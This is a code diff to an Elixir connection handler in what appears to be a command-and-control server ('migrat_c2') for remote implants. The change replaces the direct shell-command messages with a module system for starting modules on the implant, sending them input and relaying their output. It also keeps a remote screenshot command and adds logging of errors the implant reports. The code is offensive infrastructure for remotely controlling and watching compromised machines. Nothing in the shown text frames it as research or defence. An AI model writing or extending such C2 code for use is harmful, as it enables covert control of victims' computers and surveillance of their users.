@@ -28,16 +28,19 @@ defmodule Connections.Handler do
     GenServer.cast(process, :disconnect)
   end
 
-  def send_shell_command(process, command) do
-    m = %Migrat.ShellCommand{
-      command: command
-    }
+  def send_module_start(process, name, data, args, type) do
+    m = Migrat.ModuleStart.new(name: name, data: data, args: args, type: type)
+    GenServer.cast(process, {:module_start, m})
+  end
 
-    GenServer.cast(process, {:shell_command, m})
+  def send_module_input(process, modulename, command) do
+    m = Migrat.ModuleInput.new(name: modulename, input: command)
+
+    GenServer.cast(process, {:module_input, m})
   end
 
   def send_take_screenshot(process) do
-    m = %Migrat.TakeScreenshot{}
+    m = Migrat.TakeScreenshot.new()
     GenServer.cast(process, {:take_screenshot, m})
   end
 
@@ -70,13 +73,20 @@ defmodule Connections.Handler do
     {:noreply, state}
   end
 
-  def handle_cast({:shell_command, command}, state) do
-    Logger.info("process  got shell_command #{command.command}")
+  @impl true
+  def handle_cast({:error, m}, state) do
+    Logger.info("process got error from implant: #{m.message}")
+    {:noreply, state}
+  end
+
+  @impl true
+  def handle_cast({:module_start, m}, state) do
+    Logger.info("got module start for module #{m.name}")
 
     Translator.send_message(
       state.socket,
-      :shell_command,
-      command,
+      :module_start,
+      m,
       Application.fetch_env!(:migrat_c2, :initkey)
     )
     |> handle_error()
@@ -84,10 +94,35 @@ defmodule Connections.Handler do
     {:noreply, state}
   end
 
-  def handle_cast({:shell_response, response}, state) do
-    Logger.info("process  got shell_response #{response.output}")
+  @impl true
+  def handle_cast({:module_list, m}, state) do
+    Logger.info("got module list")
+    IO.inspect(m)
+    Registry.update_running_modules(state.ident.id, m.modules)
+    MigratC2.LiveUpdate.module_list(state.ident.id, m.modules)
+    {:noreply, state}
+  end
+
+  @impl true
+  def handle_cast({:module_input, input}, state) do
+    Logger.info("process got module_input for #{input.name} with data #{input.input}")
+
+    Translator.send_message(
+      state.socket,
+      :module_input,
+      input,
+      Application.fetch_env!(:migrat_c2, :initkey)
+    )
+    |> handle_error()
+
+    {:noreply, state}
+  end
+
+  def handle_cast({:module_output, response}, state) do
+    Logger.info("process  got module output from #{response.name} with data #{response.output}")
+
     Registry.insert_shell_line(state.ident.id, response.output)
-    MigratC2.LiveUpdate.command_output(state.ident.id, response.output)
+    MigratC2.LiveUpdate.module_output(state.ident.id, response.name, response.output)
     {:noreply, state}
   end
 
